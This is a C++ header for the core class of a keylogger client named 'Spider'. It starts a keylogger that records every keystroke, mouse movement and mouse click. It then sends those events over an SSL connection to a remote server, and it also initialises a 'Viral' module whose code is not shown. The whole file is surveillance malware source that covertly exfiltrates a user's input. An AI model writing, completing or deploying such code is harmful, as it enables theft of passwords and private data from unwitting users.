//
// Created by roman sztergbaum on 27/09/2017.
//

#ifndef SPIDER_CLIENT_CSPIDERCORE_HPP
#define SPIDER_CLIENT_CSPIDERCORE_HPP

#include <boost/asio.hpp>
#include <boost/asio/ssl.hpp>
#include <Protocol/CommandHandler.hpp>
#include <Network/SSLConnection.hpp>
#include <Network/ClientSession.hpp>
#include <KeyLogger/KeyLogger.hpp>
#include <KeyLogger/KeyLoggerFactory.hpp>
#include <Viral/Viral.hpp>
#include <Logging/LogHandle.hpp>

#define SPIDER_LOG "{'client-spider'}"

namespace spi
{
    class CSpiderCore
    {
    public:
        CSpiderCore() = default;
        ~CSpiderCore()
        {
            _keyLogger->stop();
            _log(lg::Info) << SPIDER_LOG << " shutdown ..." << std::endl;
        }

    public:
        bool run()
        {
            __setup();
            _log(lg::Info) << SPIDER_LOG << " running ..." << std::endl;
            _keyLogger->run();
            _clientSession->onConnect(boost::bind(&CSpiderCore::__setupLogHandleConnection, this, net::ErrorPlaceholder));
            _clientSession->connect();
            _service.run();
            return true;
        }

    private:
        void __setupLogHandleConnection(net::SSLConnection *sslConnection)
        {
            _logHandle.connect(sslConnection);
        }


        void __setup()
        {
            _viral.setup();
            _logHandle.setup();
            _keyLogger->setup();
            _keyLogger->onMouseMoveEvent([this](proto::MouseMove &&event){
                _logHandle.appendEntry(event);
            });
            _keyLogger->onMouseClickEvent([this](proto::MouseClick &&event){
                _logHandle.appendEntry(event);
            });
            _keyLogger->onKeyboardEvent([this](proto::KeyEvent &&event){
                _logHandle.appendEntry(event);
            });
        }

    private:

        // TODO : add the acceptor for server command
        // TODO : add the ssl socket
        net::IOManager _service;
        spi::net::SSLContext _ctx{spi::net::SSLContext::SSLv23Client};
        std::unique_ptr<ClientSession> _clientSession{std::make_unique<ClientSession>(_ctx, _service)};
        LogHandle _logHandle;
        Viral _viral;
        KeyLogPtr _keyLogger{Factory::createKeyLogger(_service)};
        lg::Logger _log{"client-spider", lg::Level::Debug};
    };
}

#endif //SPIDER_CLIENT_CSPIDERCORE_HPP
